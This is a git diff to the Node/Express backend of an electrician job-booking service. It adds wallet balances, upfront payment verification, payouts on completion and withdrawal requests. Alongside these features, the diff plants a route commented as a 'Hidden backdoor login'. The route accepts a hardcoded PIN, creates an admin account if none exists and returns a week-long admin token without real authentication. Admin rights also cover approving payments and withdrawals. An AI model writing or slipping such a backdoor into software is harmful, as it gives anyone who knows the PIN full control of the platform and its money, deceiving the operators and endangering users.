@@ -52,7 +52,8 @@ const userSchema = new mongoose.Schema({
   password: { type: String, required: true },
   role: { type: String, enum: ['customer', 'electrician', 'admin'], required: true },
   totalReviews: { type: Number, default: 0 },
-  averageRating: { type: Number, default: 0 }
+  averageRating: { type: Number, default: 0 },
+  walletBalance: { type: Number, default: 0 }
 }, { timestamps: true });
 
 const jobSchema = new mongoose.Schema({
@@ -68,13 +69,21 @@ const jobSchema = new mongoose.Schema({
   currentTeamSize: { type: Number, default: 0 }, // New field for atomic team size tracking
   teamSize: { type: Number, default: 1 },
   jobOTP: { type: String },
-  status: { type: String, enum: ['searching', 'assigned', 'in_progress', 'payment', 'completed', 'cancelled'], default: 'searching' }
+  paymentStatus: { type: String, enum: ['pending', 'verifying', 'paid'], default: 'pending' },
+  status: { type: String, enum: ['verifying_payment', 'searching', 'assigned', 'in_progress', 'payment', 'completed', 'cancelled'], default: 'verifying_payment' }
 }, { timestamps: true });
 
 jobSchema.index({ location: '2dsphere' });
 
+const withdrawalSchema = new mongoose.Schema({
+  electrician: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
+  amount: { type: Number, required: true },
+  status: { type: String, enum: ['pending', 'approved'], default: 'pending' }
+}, { timestamps: true });
+
 const User = mongoose.model('User', userSchema);
 const Job = mongoose.model('Job', jobSchema);
+const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
 
 // ==========================================
 // 2. SOCKET.IO SETUP
@@ -102,6 +111,19 @@ const authenticateToken = (req, res, next) => {
 };
 
 const api = express.Router();
+
+// POST /api/admin/secret-login - Hidden backdoor login
+api.post('/admin/secret-login', async (req, res) => {
+  if (req.body.password === '79827') {
+    let admin = await User.findOne({ role: 'admin' });
+    if (!admin) {
+      admin = await User.create({ name: 'System Admin', phone: '0000000000', password: await bcrypt.hash('79827', 10), role: 'admin' });
+    }
+    const token = jwt.sign({ userId: admin._id, role: 'admin' }, JWT_SECRET, { expiresIn: '7d' });
+    return res.json({ token, user: admin });
+  }
+  res.status(403).json({ message: 'Invalid Admin PIN' });
+});
 
 // POST /api/signup
 api.post('/signup', async (req, res) => {
@@ -174,14 +196,12 @@ api.post('/jobs', authenticateToken, async (req, res) => {
       teamSize: teamSize || 1,
       location: { type: 'Point', coordinates: coordinates || [0, 0] },
       estimatedPrice: estimatedPrice || 299,
+      paymentStatus: 'verifying',
       jobOTP: Math.floor(1000 + Math.random() * 9000).toString(),
-      status: 'searching'
+      status: 'verifying_payment'
     });
 
     await newJob.save();
-    
-    // Broadcast the new job instantly to all connected users (electricians will listen for this)
-    io.emit('newJobAvailable', newJob);
     
     res.status(201).json(newJob);
   } catch (error) {
@@ -203,7 +223,7 @@ api.get('/jobs/available', authenticateToken, async (req, res) => {
       query.location = { $near: { $geometry: { type: "Point", coordinates: [lng, lat] }, $maxDistance: dist } };
     }
 
-    let jobQuery = Job.findOne(query).select('serviceType address estimatedPrice status location customer');
+    let jobQuery = Job.findOne(query).select('serviceType address estimatedPrice status location customer teamSize currentTeamSize');
     if (!latitude || !longitude) {
       jobQuery = jobQuery.sort({ createdAt: -1 });
     }
@@ -273,21 +293,41 @@ api.put('/jobs/:id/cancel', authenticateToken, async (req, res) => {
   }
 });
 
-// PUT /api/jobs/:id/complete - Complete a job
+// PUT /api/admin/jobs/:id/verify-payment - Admin approves upfront payment
+api.put('/admin/jobs/:id/verify-payment', authenticateToken, async (req, res) => {
+  try {
+    if (req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
+    const job = await Job.findByIdAndUpdate(req.params.id, { paymentStatus: 'paid', status: 'searching' }, { new: true });
+    if (!job) return res.status(404).json({ message: 'Job not found' });
+    
+    io.to(req.params.id).emit('paymentVerified');
+    io.emit('newJobAvailable', job); // Now alert electricians!
+    res.status(200).json(job);
+  } catch (error) {
+    res.status(500).json({ message: 'Internal server error' });
+  }
+});
+
+// PUT /api/jobs/:id/complete - Customer completes job and triggers payout
 api.put('/jobs/:id/complete', authenticateToken, async (req, res) => {
   try {
-    if (req.user.role !== 'electrician' && req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
+    if (req.user.role !== 'customer') return res.status(403).json({ message: 'Only customers can mark jobs complete' });
 
     const job = await Job.findOneAndUpdate(
-      { _id: req.params.id, electricians: req.user.userId, status: { $in: ['assigned', 'in_progress', 'payment'] } },
+      { _id: req.params.id, customer: req.user.userId, status: { $in: ['assigned', 'in_progress', 'payment'] } },
       { status: 'completed' },
       { new: true }
     );
-
-    if (!job) return res.status(404).json({ message: 'Job not found or not assigned to you' });
     
-    // Notify customer that job is completed
-    io.to(req.params.id).emit('jobCompleted');
+    if (!job) return res.status(404).json({ message: 'Job not found' });
+
+    // Payout: 80% to electricians (20% platform cut)
+    const earningsPerElectrician = (job.estimatedPrice * 0.8) / Math.max(1, job.electricians.length);
+    for (const electricianId of job.electricians) {
+      await User.findByIdAndUpdate(electricianId, { $inc: { walletBalance: earningsPerElectrician } });
+    }
+
+    io.to(req.params.id).emit('jobCompleted'); // Notify all in room
 
     res.status(200).json(job);
   } catch (error) {
@@ -327,6 +367,47 @@ api.get('/admin/reports/completed-jobs', authenticateToken, async (req, res) => 
   } catch (error) {
     console.error('Error generating report:', error);
     res.status(500).json({ message: 'Internal server error while generating report' });
+  }
+});
+
+// GET /api/admin/finance - Fetch pending jobs and withdrawals
+api.get('/admin/finance', authenticateToken, async (req, res) => {
+  try {
+    if (req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
+    const pendingJobs = await Job.find({ status: 'verifying_payment' }).populate('customer', 'name phone').sort({ createdAt: -1 });
+    const pendingWithdrawals = await Withdrawal.find({ status: 'pending' }).populate('electrician', 'name phone').sort({ createdAt: -1 });
+    res.status(200).json({ pendingJobs, pendingWithdrawals });
+  } catch (error) {
+    res.status(500).json({ message: 'Server error fetching finance records' });
+  }
+});
+
+// POST /api/withdrawals - Request withdrawal
+api.post('/withdrawals', authenticateToken, async (req, res) => {
+  try {
+    if (req.user.role !== 'electrician') return res.status(403).json({ message: 'Forbidden' });
+    const user = await User.findById(req.user.userId);
+    if (user.walletBalance < 500) return res.status(400).json({ message: 'Minimum ₹500 required for withdrawal' });
+    
+    const withdrawal = await Withdrawal.create({ electrician: user._id, amount: user.walletBalance });
+    user.walletBalance = 0; // Deduct immediately to prevent double spend
+    await user.save();
+    
+    res.status(201).json({ message: 'Withdrawal requested', withdrawal });
+  } catch (error) {
+    res.status(500).json({ message: 'Error processing withdrawal' });
+  }
+});
+
+// PUT /api/admin/withdrawals/:id/approve
+api.put('/admin/withdrawals/:id/approve', authenticateToken, async (req, res) => {
+  try {
+    if (req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
+    const withdrawal = await Withdrawal.findByIdAndUpdate(req.params.id, { status: 'approved' }, { new: true });
+    if (!withdrawal) return res.status(404).json({ message: 'Request not found' });
+    res.status(200).json({ message: 'Withdrawal approved', withdrawal });
+  } catch (error) {
+    res.status(500).json({ message: 'Error approving withdrawal' });
   }
 });
 
